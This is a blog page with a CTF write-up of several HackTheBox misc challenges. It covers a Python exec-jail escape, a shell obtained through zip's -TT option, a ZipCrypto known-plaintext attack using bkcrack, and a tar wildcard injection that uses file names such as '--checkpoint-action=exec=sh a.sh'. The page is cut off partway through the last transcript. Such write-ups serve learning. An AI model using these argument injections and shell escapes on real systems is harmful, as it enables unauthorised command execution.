@@ -1,0 +1,356 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTBmisc(2) | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Locked Awaymain.py def open_chest():    with open(&#39;flag.txt&#39;, &#39;r&#39;) as f:        print(f.read())blacklist &#x3D; [    &#39;import&#39;, &#39;os&#39;, &#39;sys&#39;, &#39;breakpoint&#39;,    &#39;flag&#39;, &#39;txt&#39;, &#39;read&#39;, &#39;eval&#39;, &#39;exec&#39;,    &#39;dir&#39;,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTBmisc(2)">
+<meta property="og:url" content="http://mikannse.space/2024/09/07/HTBmisc(2)/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="Locked Awaymain.py def open_chest():    with open(&#39;flag.txt&#39;, &#39;r&#39;) as f:        print(f.read())blacklist &#x3D; [    &#39;import&#39;, &#39;os&#39;, &#39;sys&#39;, &#39;breakpoint&#39;,    &#39;flag&#39;, &#39;txt&#39;, &#39;read&#39;, &#39;eval&#39;, &#39;exec&#39;,    &#39;dir&#39;,">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2024-09-07T13:46:05.000Z">
+<meta property="article:modified_time" content="2024-09-07T13:48:05.148Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="misc">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/09/07/HTBmisc(2)/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTBmisc(2)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2024-09-07 21:48:05'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HTBmisc(2)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-07T13:46:05.000Z" title="发表于 2024-09-07 21:46:05">2024-09-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-07T13:48:05.148Z" title="更新于 2024-09-07 21:48:05">2024-09-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HTBmisc(2)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Locked-Away"><a href="#Locked-Away" class="headerlink" title="Locked Away"></a>Locked Away</h1><p>main.py</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">def open_chest():</span><br><span class="line">    with open('flag.txt', 'r') as f:</span><br><span class="line">        print(f.read())</span><br><span class="line"></span><br><span class="line">blacklist = [</span><br><span class="line">    'import', 'os', 'sys', 'breakpoint',</span><br><span class="line">    'flag', 'txt', 'read', 'eval', 'exec',</span><br><span class="line">    'dir', 'print', 'subprocess', '[', ']',</span><br><span class="line">    'echo', 'cat', '&gt;', '&lt;', '"', '\'', 'open'</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    command = input('The chest lies waiting... ')</span><br><span class="line"></span><br><span class="line">    if any(b in command for b in blacklist):</span><br><span class="line">        print('Invalid command!')</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        exec(command)</span><br><span class="line">    except Exception:</span><br><span class="line">        print('You have been locked away...')</span><br><span class="line">        exit(1337)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>exec</code> 是Python中的一个内置函数，它允许你在运行时动态地执行Python表达式、语句或代码块</p>
+<p>既然如此，那么可以清空黑名单列表就可以随意输入了</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ nc 94.237.58.173 45572</span><br><span class="line"></span><br><span class="line">.____                  __              .___    _____                        </span><br><span class="line">|    |    ____   ____ |  | __ ____   __| _/   /  _  \__  _  _______  ___.__.</span><br><span class="line">|    |   /  _ \_/ ___\|  |/ // __ \ / __ |   /  /_\  \ \/ \/ /\__  \&lt;   |  |</span><br><span class="line">|    |__(  &lt;_&gt; )  \___|    &lt;\  ___// /_/ |  /    |    \     /  / __ \\___  |</span><br><span class="line">|_______ \____/ \___  &gt;__|_ \\___  &gt;____ |  \____|__  /\/\_/  (____  / ____|</span><br><span class="line">        \/          \/     \/    \/     \/          \/             \/\/     </span><br><span class="line"></span><br><span class="line">The chest lies waiting... blacklist.clear()</span><br><span class="line">The chest lies waiting... open_chest()</span><br><span class="line">HTB{bL4cKl1sT?_bUt_tH4t'5_t0o_3asY}</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Compressor"><a href="#Compressor" class="headerlink" title="Compressor"></a>Compressor</h1><p>连接之后可以进入四个目录中的一个，然后有6个操作可以选择,1.创建工件，其实就是创建一个文件，可以输入内容</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ nc 94.237.53.113 37184</span><br><span class="line"></span><br><span class="line">[*] Directory to work in: JZ41Tktly8IFNwi9PtSuA1OJNkn9Fk5k                                          </span><br><span class="line"></span><br><span class="line">Component List:                                                                                     </span><br><span class="line">                                                                                                    </span><br><span class="line">+===============+                                                                                   </span><br><span class="line">|               |                                                                                   </span><br><span class="line">|  1. Head  🤖  |                                                                                   </span><br><span class="line">|  2. Torso 🦴   |                                                                                  </span><br><span class="line">|  3. Hands 💪  |                                                                                   </span><br><span class="line">|  4. Legs  🦵   |                                                                                  </span><br><span class="line">|               |                                                                                   </span><br><span class="line">+===============+                                                                                   </span><br><span class="line">                                                                                                    </span><br><span class="line">[*] Choose component: 1</span><br><span class="line"></span><br><span class="line">[*] Sub-directory to work in: JZ41Tktly8IFNwi9PtSuA1OJNkn9Fk5k/Head                                 </span><br><span class="line">                                                                                                    </span><br><span class="line"></span><br><span class="line">Actions:                                                                                            </span><br><span class="line">                                                                                                    </span><br><span class="line">1. Create artifact                                                                                  </span><br><span class="line">2. List directory    (pwd; ls -la)                                                                  </span><br><span class="line">3. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)                                              </span><br><span class="line">4. Change directory  (cd &lt;dirname&gt;)                                                                 </span><br><span class="line">5. Clean directory   (rm -rf ./*)                                                                   </span><br><span class="line">6. Exit                                                                                             </span><br><span class="line">                                                                                                    </span><br><span class="line">[*] Choose action: </span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里用到了zip指令来获得shell会话(payload参考GTFOBINS)</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ nc 94.237.53.113 37184</span><br><span class="line"></span><br><span class="line">[*] Directory to work in: JZ41Tktly8IFNwi9PtSuA1OJNkn9Fk5k                                          </span><br><span class="line"></span><br><span class="line">Component List:                                                                                     </span><br><span class="line">                                                                                                    </span><br><span class="line">+===============+                                                                                   </span><br><span class="line">|               |                                                                                   </span><br><span class="line">|  1. Head  🤖  |                                                                                   </span><br><span class="line">|  2. Torso 🦴   |                                                                                  </span><br><span class="line">|  3. Hands 💪  |                                                                                   </span><br><span class="line">|  4. Legs  🦵   |                                                                                  </span><br><span class="line">|               |                                                                                   </span><br><span class="line">+===============+                                                                                                                                                                                </span><br><span class="line">[*] Choose component: 1</span><br><span class="line"></span><br><span class="line">[*] Sub-directory to work in: JZ41Tktly8IFNwi9PtSuA1OJNkn9Fk5k/Head                                 </span><br><span class="line">                                                                                                    </span><br><span class="line">Actions:                                                                                            </span><br><span class="line">                                                                                                    </span><br><span class="line">1. Create artifact                                                                                  </span><br><span class="line">2. List directory    (pwd; ls -la)                                                                  </span><br><span class="line">3. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)                                              </span><br><span class="line">4. Change directory  (cd &lt;dirname&gt;)                                                                 </span><br><span class="line">5. Clean directory   (rm -rf ./*)                                                                   </span><br><span class="line">6. Exit                                                                                                                                                                                                </span><br><span class="line">[*] Choose action: 1</span><br><span class="line">Insert name: mikannse</span><br><span class="line">Insert content: mikannse                                                                            </span><br><span class="line">[+] Artifact [mikannse] was created successfuly!</span><br><span class="line"></span><br><span class="line">Actions:                                                                                                                                                                                        </span><br><span class="line">1. Create artifact                                                                                  </span><br><span class="line">2. List directory    (pwd; ls -la)                                                                  </span><br><span class="line">3. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)                                              </span><br><span class="line">4. Change directory  (cd &lt;dirname&gt;)                                                                 </span><br><span class="line">5. Clean directory   (rm -rf ./*)                                                                   </span><br><span class="line">6. Exit                                                                                             </span><br><span class="line">                                                                                                    </span><br><span class="line">[*] Choose action: 2</span><br><span class="line">/home/ctf/JZ41Tktly8IFNwi9PtSuA1OJNkn9Fk5k/Head</span><br><span class="line">total 12</span><br><span class="line">drwxr-sr-x    2 ctf      ctf           4096 Sep  6 04:00 .</span><br><span class="line">drwxr-sr-x    6 ctf      ctf           4096 Sep  6 03:58 ..</span><br><span class="line">-rw-r--r--    1 ctf      ctf              8 Sep  6 04:00 mikannse</span><br><span class="line"></span><br><span class="line">Actions:                                                                                                                                                                                             </span><br><span class="line">1. Create artifact                                                                                  </span><br><span class="line">2. List directory    (pwd; ls -la)                                                                  </span><br><span class="line">3. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)                                              </span><br><span class="line">4. Change directory  (cd &lt;dirname&gt;)                                                                 </span><br><span class="line">5. Clean directory   (rm -rf ./*)                                                                   </span><br><span class="line">6. Exit                                                                                             </span><br><span class="line">                                                                                                    </span><br><span class="line">[*] Choose action: 3</span><br><span class="line"></span><br><span class="line">Insert &lt;name&gt;.zip: mikannse</span><br><span class="line">Insert &lt;name&gt;: mikannse</span><br><span class="line">Insert &lt;options&gt;: -T -TT 'sh #'</span><br><span class="line">  adding: mikannse (stored 0%)</span><br><span class="line">whoami</span><br><span class="line">ctf</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="SecretRezipe"><a href="#SecretRezipe" class="headerlink" title="SecretRezipe"></a>SecretRezipe</h1><p>题目给了dockerfile和Web的源码，是一个express框架,主要逻辑在routes.js中</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> { <span class="title class_">Router</span> } = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> child_process = <span class="built_in">require</span>(<span class="string">'child_process'</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> os = <span class="built_in">require</span>(<span class="string">'os'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> { <span class="variable constant_">FLAG</span>, <span class="variable constant_">PASSWORD</span> } = <span class="built_in">require</span>(<span class="string">'./config/config'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title class_">Router</span>()</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">'/ingredients'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">  <span class="keyword">let</span> data = <span class="string">`Secret: <span class="subst">${FLAG}</span>`</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">ingredients</span>) {</span><br><span class="line">    data += <span class="string">`\n<span class="subst">${req.body.ingredients}</span>`</span></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> tempPath = os.<span class="title function_">tmpdir</span>() + <span class="string">'/'</span> + crypto.<span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">'hex'</span>)</span><br><span class="line">  fs.<span class="title function_">mkdirSync</span>(tempPath);</span><br><span class="line">  fs.<span class="title function_">writeFileSync</span>(tempPath + <span class="string">'/ingredients.txt'</span>, data)</span><br><span class="line">  child_process.<span class="title function_">execSync</span>(<span class="string">`zip -P <span class="subst">${PASSWORD}</span> <span class="subst">${tempPath}</span>/ingredients.zip <span class="subst">${tempPath}</span>/ingredients.txt`</span>)</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">sendFile</span>(tempPath + <span class="string">'/ingredients.zip'</span>)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">'/*'</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> res.<span class="title function_">sendFile</span>(__dirname + <span class="string">'/static/index.html'</span>))</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router</span><br></pre></td></tr></tbody></table></figure>
+
+<p>就是说我们可以输入一串字符，然后会被拼接到flag后面并且用zip指令指定一个密码压缩成压缩包让我们下载下来。密码是怎么来的可以在config.js中看到PASSWORD: crypto.randomUUID()</p>
+<p>UUID像是这样的格式:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[Running] node "c:\Users\mikannse\Desktop\1.js"</span><br><span class="line">644a8b2c-a71e-4d3a-8dd6-560db79c9f41</span><br></pre></td></tr></tbody></table></figure>
+
+<p>爆破压缩包的密码显然不现实，于是鉴于压缩包内的文件内容一部分是我们输入的，由于已知压缩包内容是以Secret: HTB{ 开头。</p>
+<p>还有一个重要原因是旧版的zip是使用zipcrypto进行加密，存在严重的安全漏洞。</p>
+<p>使用bkcrack工具: <a target="_blank" rel="noopener" href="https://github.com/kimci86/bkcrack">https://github.com/kimci86/bkcrack</a></p>
+<p>能看到确实是使用zipcrypto进行加密的</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">PS C:\Users\mikannse\Desktop\bkcrack-1.7.0-win64&gt; .\bkcrack.exe -L .\ingredients.zip</span><br><span class="line">bkcrack 1.7.0 - 2024-05-26</span><br><span class="line">Archive: .\ingredients.zip</span><br><span class="line">Index Encryption Compression CRC32    Uncompressed  Packed size Name</span><br><span class="line">----- ---------- ----------- -------- ------------ ------------ ----------------</span><br><span class="line">    0 ZipCrypto  Deflate     c4d7f400           48           59 tmp/72728dae00fcc05fc62ae89dc0842f66/ingredients.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p>-C指定压缩包,-c指定要获得的压缩包中的文件,-p指定明文文件，自己创建一个,内容是Secret: HTB{</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">PS C:\Users\mikannse\Desktop\bkcrack-1.7.0-win64&gt; .\bkcrack.exe -C .\ingredients.zip -c tmp/72728dae00fcc05fc62ae89dc0842f66/ingredients.txt -p .\plaintext.txt</span><br><span class="line">bkcrack 1.7.0 - 2024-05-26</span><br><span class="line">[23:09:06] Z reduction using 4 bytes of known plaintext</span><br><span class="line">100.0 % (4 / 4)</span><br><span class="line">[23:09:06] Attack on 1303249 Z values at index 6</span><br><span class="line">Keys: f52e5c12 fe26c8f1 dca2f504</span><br><span class="line">95.8 % (1247977 / 1303249)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 1247977</span><br><span class="line">[23:18:18] Keys</span><br><span class="line">f52e5c12 fe26c8f1 dca2f504</span><br></pre></td></tr></tbody></table></figure>
+
+<p>但是没搜寻到…(代填坑)</p>
+<h1 id="Micro-Storage"><a href="#Micro-Storage" class="headerlink" title="Micro Storage"></a>Micro Storage</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/secret]</span><br><span class="line">└─$ nc 83.136.255.40 30366         </span><br><span class="line">.-------------------------------------------------------------------------------------.</span><br><span class="line">| ___  ____                  _____ _                                      __   _____  |</span><br><span class="line">| |  \/  (_)                /  ___| |                                    /  | |  _  | |</span><br><span class="line">| | .  . |_  ___ _ __ ___   \ `--.| |_ ___  _ __ __ _  __ _  ___  __   __`| | | |/' | |</span><br><span class="line">| | |\/| | |/ __| '__/ _ \   `--. \ __/ _ \| '__/ _` |/ _` |/ _ \ \ \ / / | | |  /| | |</span><br><span class="line">| | |  | | | (__| | | (_) | /\__/ / || (_) | | | (_| | (_| |  __/  \ V / _| |_\ |_/ / |</span><br><span class="line">| \_|  |_/_|\___|_|  \___/  \____/ \__\___/|_|  \__,_|\__, |\___|   \_/  \___(_)___/  |</span><br><span class="line">|             B y  H a c k T h e B o x  L a b s        __/ |                          |</span><br><span class="line">|                                                     |___/                           |</span><br><span class="line">`-----------------------.                                   .-------------------------'</span><br><span class="line">                        |  Welcome to your online temporary |</span><br><span class="line">                        |            Micro Storage          |</span><br><span class="line">                        `-----------------------------------'</span><br><span class="line"></span><br><span class="line">                                   \!/ WARNING \!/</span><br><span class="line">   Your storage only lasts during the ongoing session, once the session killed, all</span><br><span class="line">                  your files will be gone. Use this service responsibly.</span><br><span class="line">                                 ---------o---------</span><br><span class="line"></span><br><span class="line">1 =&gt; Upload a new file (10 file(s) remaining)             </span><br><span class="line">2 =&gt; List your uploaded files (0 file(s) uploaded so far)</span><br><span class="line">3 =&gt; Delete a file                                        </span><br><span class="line">4 =&gt; Print file content                                   </span><br><span class="line">5 =&gt; Compress and download all your files                 </span><br><span class="line">0 =&gt; Quit (you will lose your files!)                     </span><br><span class="line">&gt;&gt;&gt; Choose an option:</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以做以上操作，随便写一点然后压缩写在下来，base64解码之后发现是一个tar包</p>
+<p>那么猜测使用的像是 tar -cf * 的命令，那么显然可以用检查点的方式来执行脚本命令了</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">1 =&gt; Upload a new file (10 file(s) remaining)             </span><br><span class="line">2 =&gt; List your uploaded files (0 file(s) uploaded so far)</span><br><span class="line">3 =&gt; Delete a file                                        </span><br><span class="line">4 =&gt; Print file content                                   </span><br><span class="line">5 =&gt; Compress and download all your files                 </span><br><span class="line">0 =&gt; Quit (you will lose your files!)                     </span><br><span class="line">&gt;&gt;&gt; Choose an option: 1</span><br><span class="line">[*] Enter your file name: a.sh</span><br><span class="line">[*] Start typing your file content: (send 'EOF' when done)</span><br><span class="line">cat /flag.txtEOF</span><br><span class="line">[+] Your file "a.sh" has been saved. (13 bytes written)</span><br><span class="line">1 =&gt; Upload a new file (9 file(s) remaining)             </span><br><span class="line">2 =&gt; List your uploaded files (1 file(s) uploaded so far)</span><br><span class="line">3 =&gt; Delete a file                                        </span><br><span class="line">4 =&gt; Print file content                                   </span><br><span class="line">5 =&gt; Compress and download all your files                 </span><br><span class="line">0 =&gt; Quit (you will lose your files!)                     </span><br><span class="line">&gt;&gt;&gt; Choose an option: 1</span><br><span class="line">[*] Enter your file name: --checkpoint=1</span><br><span class="line">[*] Start typing your file content: (send 'EOF' when done)</span><br><span class="line">1EOF</span><br><span class="line">[+] Your file "--checkpoint=1" has been saved. (1 bytes written)</span><br><span class="line">1 =&gt; Upload a new file (8 file(s) remaining)             </span><br><span class="line">2 =&gt; List your uploaded files (2 file(s) uploaded so far)</span><br><span class="line">3 =&gt; Delete a file                                        </span><br><span class="line">4 =&gt; Print file content                                   </span><br><span class="line">5 =&gt; Compress and download all your files                 </span><br><span class="line">0 =&gt; Quit (you will lose your files!)                     </span><br><span class="line">&gt;&gt;&gt; Choose an option: 1</span><br><span class="line">[*] Enter your file name: --checkpoint-action=exec=sh a.sh</span><br><span class="line">[*] Start typing your file content: (send 'EOF' when done)</span><br><span class="line">1EOF</span><br><span class="line">[+] Your file "--checkpoint-action=exec=sh a.sh" has been saved. (1 bytes written)</span><br><span class="line">1 =&gt; Upload a new file (7 file(s) remaining)             </span><br><span class="line">2 =&gt; List your uploaded files (3 file(s) uploaded so far)</span><br><span class="line">3 =&gt; Delete a file                                        </span><br><span class="line">4 =&gt; Print file content                                   </span><br><span class="line">5 =&gt; Compress and download all your files                 </span><br><span class="line">0 